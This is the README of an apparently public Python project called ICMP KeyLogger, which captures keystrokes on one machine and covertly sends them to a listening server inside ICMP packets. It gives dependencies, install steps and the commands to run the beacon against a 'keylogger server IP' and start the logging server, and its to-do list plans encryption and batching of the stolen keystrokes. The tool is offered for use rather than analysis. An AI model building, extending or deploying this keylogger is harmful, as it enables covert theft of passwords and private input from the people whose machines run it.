
# ICMP KeyLogger

## Introduction
ICMP KeyLogger is a basic tool written in python designed to capture and transmit keystrokes over the network using ICMP packets. It is divided into two main components: the Beacon, which captures keystrokes and sends them, and the Server, which receives and logs these keystrokes.

This project is inspired from: https://github.com/krabelize/icmpdoor

### TODO
- Implement encryption for keystroke data.
- Group packets instead of sending keystrokes instantly.

## Requirements
### Windows
- [npcap](https://nmap.org/npcap/)
- pynput
- scapy

### Linux
- pynput
- scapy

## Installation
Install Python dependencies using pip:
```pip install pynput scapy```

## Usage
### Identifying Network Interface on Windows
To find the full name of the network interface:

```ipconfig /all```

Use the Description field of the relevant interface.

### Running the Beacon
Run the Beacon component using the following command. Replace `[interface]` with the actual description of your network interface and `[keylogger server IP]` with the IP address of the server.

```py ICMPbeacon.py -i "[interface]" -d [keylogger server IP]```

### Running the Server
Run the Server component with the following command. Replace `[listening interface]` with the network interface the server should listen on and `[beacon IP]` with the IP address of the beacon.

```sudo python3 ICMPlogServ.py -i [listening interface] -d [beacon IP]```
